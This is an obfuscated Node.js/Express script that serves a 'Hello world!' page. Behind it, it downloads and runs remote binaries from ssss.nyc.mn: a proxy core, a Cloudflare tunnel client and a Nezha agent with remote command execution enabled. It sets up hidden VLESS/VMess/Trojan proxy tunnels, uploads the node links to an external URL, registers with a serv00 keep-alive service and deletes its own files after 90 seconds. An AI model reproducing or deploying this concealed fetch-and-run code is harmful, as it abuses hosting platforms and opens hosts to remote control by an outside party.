const _0x22b93f=_0x3c7a;function _0x3ec2(){const _0x1a8b6a=['CFPORT','arm','3203669xaBdTD','/sub.txt\x20saved\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/2go','\x0a\x20\x20\x20\x20','bot\x20is\x20running.','&path=%2Ftrojan-argo%3Fed%3D2560#','none','6tVvXiS','https://arm64.ssss.nyc.mn/2go','9afd1229-b893-40c1-84dd-51e7ce204913','ARGO_DOMAIN:','stringify','\x0a\x20\x20credentials-file:\x20','http','346660XQMDYn','quic','direct','/bot\x20','/npm\x20-s\x20','UPLOAD_URL','php\x20running\x20error:\x20','Hello\x20world!','?security=tls&sni=','error','catch','2053','UUID','fileUrl','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','unlink','send','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','./tmp','\x0a\x20\x20\x0avmess://','forEach','SERVER_PORT','FILE_PATH','unshift','log','--tls','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','close','ARGO_DOMAIN','vless','set','sub','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','SUB_PATH','exec','test','trojan','ARGO_AUTH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&type=ws&host=','https://arm64.ssss.nyc.mn/agent','10pliKIO','AUTO_ACCESS','\x20successfully','chmod','tunnel.json','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vless-argo','\x20failed:\x20','443','/api/delete-nodes','Skipping\x20adding\x20automatic\x20access\x20task','Download\x20','bot\x20is\x20running','https://amd64.ssss.nyc.mn/agent','/php\x20-c\x20\x22','post','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','from','www.visa.com.sg','web','\x0a\x20\x20tunnel:\x20','env','status','193370nabuTr','PORT','Error\x20downloading\x20files:','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','nohup\x20','CFIP','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','2083','https://amd64.ssss.nyc.mn/v1','\x0avless://','true','config.json','automatic\x20access\x20task\x20added\x20successfully','Empowerment\x20success\x20for\x20','response','npm','php\x20is\x20running','tcp','block','\x20>/dev/null\x202>&1\x20&','then','Error\x20executing\x20command:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/tunnel.yml\x20run','base64','blackhole','https+local://8.8.8.8/dns-query','3869144VYPToc','TunnelSecret','pop','bot','添加URL失败:\x20','Subscription\x20uploaded\x20successfully','text/plain;\x20charset=utf-8','598172ZWydHL','https://arm64.ssss.nyc.mn/v1','\x20-p\x20','arm64','?encryption=none&security=tls&sni=','get','clear','vmess','join','message','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','createWriteStream','existsSync','2096','/vmess-argo','8443','ArgoDomain:','readFileSync','tls','&path=%2Fvless-argo%3Fed%3D2560#','/api/add-nodes','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','includes','utf-8','NEZHA_PORT','aarch64','Empowerment\x20failed\x20for\x20','\x20>/dev/null\x202>&1','./web','amd','toString','/api/add-subscriptions','web\x20is\x20running','all','/vmess-argo?ed=2560','push','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_PORT','util','fileName','/config.json\x20>/dev/null\x202>&1\x20&','NAME','npm\x20running\x20error:\x20','681104qfkxXv','https://arm64.ssss.nyc.mn/web','freedom','map','writeFileSync','sub.txt','match','listen','application/json','36LbGyYp','length','data','split','./bot','child_process','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','127.0.0.1','false','1262424Otgmom','./npm','boot.log','mkdirSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','\x0a\x20\x20\x0atrojan://','App\x20is\x20running','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','trim','Content-Type','stream'];_0x3ec2=function(){return _0x1a8b6a;};return _0x3ec2();}(function(_0x352576,_0x28b1a7){const _0x52eea7=_0x3c7a,_0x228196=_0x352576();while(!![]){try{const _0x2c3d88=parseInt(_0x52eea7(0x15c))/0x1+parseInt(_0x52eea7(0x17f))/0x2+-parseInt(_0x52eea7(0x1bd))/0x3+-parseInt(_0x52eea7(0x1ab))/0x4*(-parseInt(_0x52eea7(0x144))/0x5)+parseInt(_0x52eea7(0x1d2))/0x6*(parseInt(_0x52eea7(0x1ca))/0x7)+-parseInt(_0x52eea7(0x178))/0x8+parseInt(_0x52eea7(0x1b4))/0x9*(-parseInt(_0x52eea7(0x11b))/0xa);if(_0x2c3d88===_0x28b1a7)break;else _0x228196['push'](_0x228196['shift']());}catch(_0x3e8307){_0x228196['push'](_0x228196['shift']());}}}(_0x3ec2,0x3c708));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x22b93f(0x1a6)),exec=promisify(require(_0x22b93f(0x1b9))[_0x22b93f(0x13d)]),{execSync}=require(_0x22b93f(0x1b9)),UPLOAD_URL=process[_0x22b93f(0x15a)][_0x22b93f(0x120)]||'',PROJECT_URL=process[_0x22b93f(0x15a)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x22b93f(0x145)]||![],FILE_PATH=process[_0x22b93f(0x15a)][_0x22b93f(0x131)]||_0x22b93f(0x12d),SUB_PATH=process['env'][_0x22b93f(0x13c)]||_0x22b93f(0x13a),PORT=process[_0x22b93f(0x15a)][_0x22b93f(0x130)]||process[_0x22b93f(0x15a)][_0x22b93f(0x15d)]||0xbb8,UUID=process[_0x22b93f(0x15a)][_0x22b93f(0x127)]||_0x22b93f(0x1d4),NEZHA_SERVER=process[_0x22b93f(0x15a)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x22b93f(0x15a)][_0x22b93f(0x198)]||'',NEZHA_KEY=process[_0x22b93f(0x15a)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x22b93f(0x15a)][_0x22b93f(0x137)]||'',ARGO_AUTH=process[_0x22b93f(0x15a)][_0x22b93f(0x140)]||'',ARGO_PORT=process[_0x22b93f(0x15a)][_0x22b93f(0x1a5)]||0x1f41,CFIP=process[_0x22b93f(0x15a)][_0x22b93f(0x161)]||_0x22b93f(0x157),CFPORT=process[_0x22b93f(0x15a)][_0x22b93f(0x1c8)]||0x1bb,NAME=process[_0x22b93f(0x15a)][_0x22b93f(0x1a9)]||'Vls';!fs['existsSync'](FILE_PATH)?(fs[_0x22b93f(0x1c0)](FILE_PATH),console[_0x22b93f(0x133)](FILE_PATH+'\x20is\x20created')):console[_0x22b93f(0x133)](FILE_PATH+'\x20already\x20exists');let npmPath=path['join'](FILE_PATH,'npm'),phpPath=path['join'](FILE_PATH,'php'),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x22b93f(0x187)](FILE_PATH,_0x22b93f(0x17b)),subPath=path['join'](FILE_PATH,_0x22b93f(0x1b0)),listPath=path[_0x22b93f(0x187)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x22b93f(0x1bf)),configPath=path['join'](FILE_PATH,_0x22b93f(0x168));function deleteNodes(){const _0x46e4d0=_0x22b93f;try{if(!UPLOAD_URL)return;if(!fs[_0x46e4d0(0x18b)](subPath))return;let _0x3e37bb;try{_0x3e37bb=fs[_0x46e4d0(0x190)](subPath,_0x46e4d0(0x197));}catch{return null;}const _0x5b658d=Buffer['from'](_0x3e37bb,_0x46e4d0(0x175))[_0x46e4d0(0x19e)](_0x46e4d0(0x197)),_0x53d4fa=_0x5b658d[_0x46e4d0(0x1b7)]('\x0a')['filter'](_0x68fdda=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x46e4d0(0x13e)](_0x68fdda));if(_0x53d4fa[_0x46e4d0(0x1b5)]===0x0)return;return axios[_0x46e4d0(0x154)](UPLOAD_URL+_0x46e4d0(0x14e),JSON['stringify']({'nodes':_0x53d4fa}),{'headers':{'Content-Type':'application/json'}})[_0x46e4d0(0x125)](_0x93d4e8=>{return null;});}catch(_0x52dd07){return null;}}function cleanupOldFiles(){const _0x2ad656=_0x22b93f,_0x28cbc9=[_0x2ad656(0x158),_0x2ad656(0x17b),_0x2ad656(0x16c),'php',_0x2ad656(0x1b0),'boot.log'];_0x28cbc9[_0x2ad656(0x12f)](_0x24a264=>{const _0x369667=_0x2ad656,_0x35352e=path[_0x369667(0x187)](FILE_PATH,_0x24a264);fs[_0x369667(0x12a)](_0x35352e,()=>{});});}app['get']('/',function(_0x386221,_0x8f5b1b){const _0x26ca07=_0x22b93f;_0x8f5b1b[_0x26ca07(0x12b)](_0x26ca07(0x122));});function _0x3c7a(_0x4881e3,_0x22986e){const _0x3ec2ed=_0x3ec2();return _0x3c7a=function(_0x3c7ada,_0x4e8f32){_0x3c7ada=_0x3c7ada-0x118;let _0x123a22=_0x3ec2ed[_0x3c7ada];return _0x123a22;},_0x3c7a(_0x4881e3,_0x22986e);}const config={'log':{'access':'/dev/null','error':_0x22b93f(0x163),'loglevel':_0x22b93f(0x1d1)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x22b93f(0x138),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x22b93f(0x1d1),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x22b93f(0x18d),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x22b93f(0x16e)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x22b93f(0x138),'settings':{'clients':[{'id':UUID}],'decryption':_0x22b93f(0x1d1)},'streamSettings':{'network':_0x22b93f(0x16e),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x22b93f(0x138),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x22b93f(0x1d1),'wsSettings':{'path':_0x22b93f(0x14b)}},'sniffing':{'enabled':![],'destOverride':[_0x22b93f(0x11a),_0x22b93f(0x191),_0x22b93f(0x11c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x22b93f(0x1bb),'protocol':_0x22b93f(0x186),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x22b93f(0x18d)}},'sniffing':{'enabled':![],'destOverride':['http',_0x22b93f(0x191),_0x22b93f(0x11c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x22b93f(0x1bb),'protocol':_0x22b93f(0x13f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x22b93f(0x1d1),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':![],'destOverride':['http',_0x22b93f(0x191),_0x22b93f(0x11c)],'metadataOnly':![]}}],'dns':{'servers':[_0x22b93f(0x177)]},'outbounds':[{'protocol':_0x22b93f(0x1ad),'tag':_0x22b93f(0x11d)},{'protocol':_0x22b93f(0x176),'tag':_0x22b93f(0x16f)}]};fs['writeFileSync'](path[_0x22b93f(0x187)](FILE_PATH,'config.json'),JSON[_0x22b93f(0x118)](config,null,0x2));function getSystemArchitecture(){const _0x5a2dab=_0x22b93f,_0x2f9b05=os['arch']();return _0x2f9b05==='arm'||_0x2f9b05===_0x5a2dab(0x182)||_0x2f9b05===_0x5a2dab(0x199)?_0x5a2dab(0x1c9):_0x5a2dab(0x19d);}function downloadFile(_0x32c628,_0x1394b0,_0xc8c718){const _0x20ffad=_0x22b93f,_0x2ac4ee=path[_0x20ffad(0x187)](FILE_PATH,_0x32c628),_0x154d69=fs[_0x20ffad(0x18a)](_0x2ac4ee);axios({'method':_0x20ffad(0x184),'url':_0x1394b0,'responseType':_0x20ffad(0x1c7)})[_0x20ffad(0x171)](_0x1df77a=>{const _0x50d279=_0x20ffad;_0x1df77a[_0x50d279(0x1b6)]['pipe'](_0x154d69),_0x154d69['on']('finish',()=>{const _0x2830a7=_0x50d279;_0x154d69[_0x2830a7(0x136)](),console[_0x2830a7(0x133)]('Download\x20'+_0x32c628+_0x2830a7(0x146)),_0xc8c718(null,_0x32c628);}),_0x154d69['on'](_0x50d279(0x124),_0x1739f0=>{const _0x52ce43=_0x50d279;fs[_0x52ce43(0x12a)](_0x2ac4ee,()=>{});const _0x5af601=_0x52ce43(0x150)+_0x32c628+_0x52ce43(0x14c)+_0x1739f0[_0x52ce43(0x188)];console[_0x52ce43(0x124)](_0x5af601),_0xc8c718(_0x5af601);});})['catch'](_0x28602c=>{const _0x146b0a=_0x20ffad,_0x51fbd8=_0x146b0a(0x150)+_0x32c628+_0x146b0a(0x14c)+_0x28602c['message'];console[_0x146b0a(0x124)](_0x51fbd8),_0xc8c718(_0x51fbd8);});}async function downloadFilesAndRun(){const _0x2e018d=_0x22b93f,_0x5147a4=getSystemArchitecture(),_0x1d89c3=getFilesForArchitecture(_0x5147a4);if(_0x1d89c3['length']===0x0){console[_0x2e018d(0x133)](_0x2e018d(0x129));return;}const _0x32e209=_0x1d89c3[_0x2e018d(0x1ae)](_0x2f0643=>{return new Promise((_0x108d0a,_0xcc9765)=>{const _0x1997f3=_0x3c7a;downloadFile(_0x2f0643[_0x1997f3(0x1a7)],_0x2f0643[_0x1997f3(0x128)],(_0x50d8cd,_0x20acaf)=>{_0x50d8cd?_0xcc9765(_0x50d8cd):_0x108d0a(_0x20acaf);});});});try{await Promise[_0x2e018d(0x1a1)](_0x32e209);}catch(_0x4b9998){console['error'](_0x2e018d(0x15e),_0x4b9998);return;}function _0x522315(_0x1d1eed){const _0x95a703=_0x2e018d,_0x245749=0x1fd;_0x1d1eed[_0x95a703(0x12f)](_0x2055fd=>{const _0x3dbb83=_0x95a703,_0x242bad=path[_0x3dbb83(0x187)](FILE_PATH,_0x2055fd);fs[_0x3dbb83(0x18b)](_0x242bad)&&fs[_0x3dbb83(0x147)](_0x242bad,_0x245749,_0x382f1e=>{const _0x22a428=_0x3dbb83;_0x382f1e?console['error'](_0x22a428(0x19a)+_0x242bad+':\x20'+_0x382f1e):console[_0x22a428(0x133)](_0x22a428(0x16a)+_0x242bad+':\x20'+_0x245749['toString'](0x8));});});}const _0x3bc2d4=NEZHA_PORT?[_0x2e018d(0x1be),_0x2e018d(0x19c),_0x2e018d(0x1b8)]:['./php','./web',_0x2e018d(0x1b8)];_0x522315(_0x3bc2d4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ca6fc=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2e018d(0x17a)]():'',_0x435cfd=new Set([_0x2e018d(0x14d),_0x2e018d(0x18e),_0x2e018d(0x18c),_0x2e018d(0x149),_0x2e018d(0x164),_0x2e018d(0x126)]),_0x3aa975=_0x435cfd['has'](_0x3ca6fc)?_0x2e018d(0x167):_0x2e018d(0x1bc),_0x28a2b7='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2e018d(0x1c1)+NEZHA_SERVER+_0x2e018d(0x1ba)+_0x3aa975+_0x2e018d(0x162)+UUID;fs[_0x2e018d(0x1af)](path[_0x2e018d(0x187)](FILE_PATH,'config.yaml'),_0x28a2b7);const _0x343eb6=_0x2e018d(0x160)+FILE_PATH+_0x2e018d(0x153)+FILE_PATH+_0x2e018d(0x1a4);try{await exec(_0x343eb6),console[_0x2e018d(0x133)](_0x2e018d(0x16d)),await new Promise(_0x4551e0=>setTimeout(_0x4551e0,0x3e8));}catch(_0x36f62b){console[_0x2e018d(0x124)](_0x2e018d(0x121)+_0x36f62b);}}else{let _0xcea1e7='';const _0x423039=[_0x2e018d(0x14d),'8443',_0x2e018d(0x18c),_0x2e018d(0x149),_0x2e018d(0x164),_0x2e018d(0x126)];_0x423039[_0x2e018d(0x196)](NEZHA_PORT)&&(_0xcea1e7=_0x2e018d(0x134));const _0x554624=_0x2e018d(0x160)+FILE_PATH+_0x2e018d(0x11f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2e018d(0x181)+NEZHA_KEY+'\x20'+_0xcea1e7+_0x2e018d(0x170);try{await exec(_0x554624),console['log']('npm\x20is\x20running'),await new Promise(_0x4c9f2f=>setTimeout(_0x4c9f2f,0x3e8));}catch(_0xbc339f){console[_0x2e018d(0x124)](_0x2e018d(0x1aa)+_0xbc339f);}}}else console[_0x2e018d(0x133)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x569c71=_0x2e018d(0x160)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x2e018d(0x1a8);try{await exec(_0x569c71),console['log'](_0x2e018d(0x1a0)),await new Promise(_0x33467c=>setTimeout(_0x33467c,0x3e8));}catch(_0x2c083a){console[_0x2e018d(0x124)]('web\x20running\x20error:\x20'+_0x2c083a);}if(fs[_0x2e018d(0x18b)](path[_0x2e018d(0x187)](FILE_PATH,_0x2e018d(0x17b)))){let _0x5b8db9;if(ARGO_AUTH[_0x2e018d(0x1b1)](/^[A-Z0-9a-z=]{120,250}$/))_0x5b8db9=_0x2e018d(0x14a)+ARGO_AUTH;else ARGO_AUTH[_0x2e018d(0x1b1)](/TunnelSecret/)?_0x5b8db9=_0x2e018d(0x155)+FILE_PATH+_0x2e018d(0x174):_0x5b8db9=_0x2e018d(0x195)+FILE_PATH+_0x2e018d(0x141)+ARGO_PORT;try{await exec(_0x2e018d(0x160)+FILE_PATH+_0x2e018d(0x11e)+_0x5b8db9+_0x2e018d(0x170)),console[_0x2e018d(0x133)](_0x2e018d(0x151)),await new Promise(_0x52dd89=>setTimeout(_0x52dd89,0x7d0));}catch(_0x391cbc){console[_0x2e018d(0x124)](_0x2e018d(0x172)+_0x391cbc);}}await new Promise(_0x12cfb2=>setTimeout(_0x12cfb2,0x1388));}function getFilesForArchitecture(_0x307fd5){const _0x31ea7b=_0x22b93f;let _0x26c0e0;_0x307fd5==='arm'?_0x26c0e0=[{'fileName':_0x31ea7b(0x158),'fileUrl':_0x31ea7b(0x1ac)},{'fileName':_0x31ea7b(0x17b),'fileUrl':_0x31ea7b(0x1d3)}]:_0x26c0e0=[{'fileName':_0x31ea7b(0x158),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x31ea7b(0x17b),'fileUrl':_0x31ea7b(0x1cd)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4aad3c=_0x307fd5==='arm'?_0x31ea7b(0x143):_0x31ea7b(0x152);_0x26c0e0['unshift']({'fileName':'npm','fileUrl':_0x4aad3c});}else{const _0x2aeb1d=_0x307fd5==='arm'?_0x31ea7b(0x180):_0x31ea7b(0x165);_0x26c0e0[_0x31ea7b(0x132)]({'fileName':'php','fileUrl':_0x2aeb1d});}}return _0x26c0e0;}function argoType(){const _0xf4c3e9=_0x22b93f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xf4c3e9(0x133)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0xf4c3e9(0x196)](_0xf4c3e9(0x179))){fs[_0xf4c3e9(0x1af)](path[_0xf4c3e9(0x187)](FILE_PATH,_0xf4c3e9(0x148)),ARGO_AUTH);const _0x19e647=_0xf4c3e9(0x159)+ARGO_AUTH[_0xf4c3e9(0x1b7)]('\x22')[0xb]+_0xf4c3e9(0x119)+path[_0xf4c3e9(0x187)](FILE_PATH,_0xf4c3e9(0x148))+_0xf4c3e9(0x1c4)+ARGO_DOMAIN+_0xf4c3e9(0x1cc)+ARGO_PORT+_0xf4c3e9(0x173);fs[_0xf4c3e9(0x1af)](path[_0xf4c3e9(0x187)](FILE_PATH,'tunnel.yml'),_0x19e647);}else console[_0xf4c3e9(0x133)](_0xf4c3e9(0x12c));}argoType();async function extractDomains(){const _0x16b0ba=_0x22b93f;let _0x197de9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x197de9=ARGO_DOMAIN,console[_0x16b0ba(0x133)](_0x16b0ba(0x1d5),_0x197de9),await _0x3d0283(_0x197de9);else try{const _0x48762b=fs[_0x16b0ba(0x190)](path[_0x16b0ba(0x187)](FILE_PATH,_0x16b0ba(0x1bf)),_0x16b0ba(0x197)),_0x2b2f4c=_0x48762b['split']('\x0a'),_0x5afd2f=[];_0x2b2f4c[_0x16b0ba(0x12f)](_0x1980e8=>{const _0x33f5ef=_0x16b0ba,_0x21c9ad=_0x1980e8[_0x33f5ef(0x1b1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x21c9ad){const _0x382b11=_0x21c9ad[0x1];_0x5afd2f[_0x33f5ef(0x1a3)](_0x382b11);}});if(_0x5afd2f[_0x16b0ba(0x1b5)]>0x0)_0x197de9=_0x5afd2f[0x0],console[_0x16b0ba(0x133)](_0x16b0ba(0x18f),_0x197de9),await _0x3d0283(_0x197de9);else{console[_0x16b0ba(0x133)](_0x16b0ba(0x135)),fs[_0x16b0ba(0x194)](path[_0x16b0ba(0x187)](FILE_PATH,'boot.log'));async function _0x4e2d3c(){const _0x3d19f8=_0x16b0ba;try{await exec(_0x3d19f8(0x15f));}catch(_0x51540c){}}_0x4e2d3c(),await new Promise(_0x48c648=>setTimeout(_0x48c648,0xbb8));const _0x304fbe=_0x16b0ba(0x195)+FILE_PATH+_0x16b0ba(0x141)+ARGO_PORT;try{await exec(_0x16b0ba(0x160)+path[_0x16b0ba(0x187)](FILE_PATH,_0x16b0ba(0x17b))+'\x20'+_0x304fbe+'\x20>/dev/null\x202>&1\x20&'),console[_0x16b0ba(0x133)](_0x16b0ba(0x1cf)),await new Promise(_0x7dc14c=>setTimeout(_0x7dc14c,0xbb8)),await extractDomains();}catch(_0x1a7350){console[_0x16b0ba(0x124)](_0x16b0ba(0x172)+_0x1a7350);}}}catch(_0x3b7260){console[_0x16b0ba(0x124)]('Error\x20reading\x20boot.log:',_0x3b7260);}async function _0x3d0283(_0xc41f36){const _0x1c3aef=_0x16b0ba,_0x30b72a=execSync(_0x1c3aef(0x189),{'encoding':'utf-8'}),_0x3de6fe=_0x30b72a[_0x1c3aef(0x1c5)]();return new Promise(_0x1228b1=>{setTimeout(()=>{const _0x5465f9=_0x3c7a,_0x521a6d={'v':'2','ps':NAME+'-'+_0x3de6fe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5465f9(0x1d1),'net':'ws','type':_0x5465f9(0x1d1),'host':_0xc41f36,'path':_0x5465f9(0x1a2),'tls':_0x5465f9(0x191),'sni':_0xc41f36,'alpn':''},_0x40118b=_0x5465f9(0x166)+UUID+'@'+CFIP+':'+CFPORT+_0x5465f9(0x183)+_0xc41f36+_0x5465f9(0x142)+_0xc41f36+_0x5465f9(0x192)+NAME+'-'+_0x3de6fe+_0x5465f9(0x12e)+Buffer[_0x5465f9(0x156)](JSON['stringify'](_0x521a6d))[_0x5465f9(0x19e)](_0x5465f9(0x175))+_0x5465f9(0x1c2)+UUID+'@'+CFIP+':'+CFPORT+_0x5465f9(0x123)+_0xc41f36+_0x5465f9(0x142)+_0xc41f36+_0x5465f9(0x1d0)+NAME+'-'+_0x3de6fe+_0x5465f9(0x1ce);console[_0x5465f9(0x133)](Buffer['from'](_0x40118b)[_0x5465f9(0x19e)](_0x5465f9(0x175))),fs['writeFileSync'](subPath,Buffer['from'](_0x40118b)[_0x5465f9(0x19e)]('base64')),console[_0x5465f9(0x133)](FILE_PATH+_0x5465f9(0x1cb)),uplodNodes(),app[_0x5465f9(0x184)]('/'+SUB_PATH,(_0x2e7d04,_0x251e9f)=>{const _0x24d161=_0x5465f9,_0x277ac5=Buffer[_0x24d161(0x156)](_0x40118b)[_0x24d161(0x19e)](_0x24d161(0x175));_0x251e9f[_0x24d161(0x139)](_0x24d161(0x1c6),_0x24d161(0x17e)),_0x251e9f[_0x24d161(0x12b)](_0x277ac5);}),_0x1228b1(_0x40118b);},0x7d0);});}}async function uplodNodes(){const _0x1cd50e=_0x22b93f;if(UPLOAD_URL&&PROJECT_URL){const _0x14b4a6=PROJECT_URL+'/'+SUB_PATH,_0x4e9a0e={'subscription':[_0x14b4a6]};try{const _0x946639=await axios[_0x1cd50e(0x154)](UPLOAD_URL+_0x1cd50e(0x19f),_0x4e9a0e,{'headers':{'Content-Type':_0x1cd50e(0x1b3)}});if(_0x946639[_0x1cd50e(0x15b)]===0xc8)console['log'](_0x1cd50e(0x17d));else return null;}catch(_0x47eacc){if(_0x47eacc[_0x1cd50e(0x16b)]){if(_0x47eacc[_0x1cd50e(0x16b)][_0x1cd50e(0x15b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x57b810=fs[_0x1cd50e(0x190)](listPath,_0x1cd50e(0x197)),_0xaae7e0=_0x57b810[_0x1cd50e(0x1b7)]('\x0a')['filter'](_0x18428c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x18428c));if(_0xaae7e0['length']===0x0)return;const _0x53dfeb=JSON[_0x1cd50e(0x118)]({'nodes':_0xaae7e0});try{await axios['post'](UPLOAD_URL+_0x1cd50e(0x193),_0x53dfeb,{'headers':{'Content-Type':_0x1cd50e(0x1b3)}});if(response['status']===0xc8)console[_0x1cd50e(0x133)](_0x1cd50e(0x17d));else return null;}catch(_0x5823e4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x49d051=_0x3c7a,_0xde684a=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xde684a[_0x49d051(0x1a3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xde684a[_0x49d051(0x1a3)](phpPath);exec('rm\x20-rf\x20'+_0xde684a['join']('\x20')+_0x49d051(0x19b),_0x3db741=>{const _0x31c39e=_0x49d051;console[_0x31c39e(0x185)](),console[_0x31c39e(0x133)](_0x31c39e(0x1c3)),console[_0x31c39e(0x133)](_0x31c39e(0x13b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x486822=_0x22b93f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x486822(0x133)](_0x486822(0x14f));return;}try{const _0x6d5982=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console['log'](_0x486822(0x169));}catch(_0x49bbd5){console[_0x486822(0x124)](_0x486822(0x17c)+_0x49bbd5[_0x486822(0x188)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x22b93f(0x1b2)](PORT,()=>console[_0x22b93f(0x133)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
